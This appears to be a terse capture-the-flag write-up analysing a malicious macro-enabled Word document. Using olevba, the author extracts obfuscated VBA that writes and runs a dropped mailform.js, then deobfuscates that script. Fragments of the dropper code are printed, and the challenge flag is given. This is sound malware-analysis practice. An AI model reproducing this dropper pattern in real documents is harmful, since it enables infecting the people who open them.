...
Docm file sor probably malicious vba
install oletools : `sudo -H pip install -U oletools[full]`
`olevba invitation.docm` give us *NewMacros.bas*

Goes on windowscopy invitation.docm
Delete : check for domain
```
...
change : `kWXlyKwVj = "C:\Users\flamethrower\Downloads"` in order to write somewhere else
...
can't be DELETED !!!! because need call to JFqcfEGnc (xor function)
```
If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO // I delete this line
End If
```

Can stop here, the file mailform.js is correctly written :
```
IAiiymixt = kWXlyKwVj & "\" & "mailform.js" ' create file
Open (IAiiymixt) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j ' write in mailform
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
```

put the js in a js beautifier (beautifier.io), and we obtain the current mailform.js
install node : 

node mailform.js give error because of WScript.Arguments which is given by the word document
This line : `R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"` call mailform.js with one argument : *vF8rdgMHKBrvCoCp0ulm*
in js we see only the first argument (`var lVky = WScript.Arguments;var DASz = lVky(0);`) is used, go in debugger on word and get the first argument in order to replace
so replace :
```
...
again beautifier... give f.js
The flag is in f.js under : `S47T.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");`
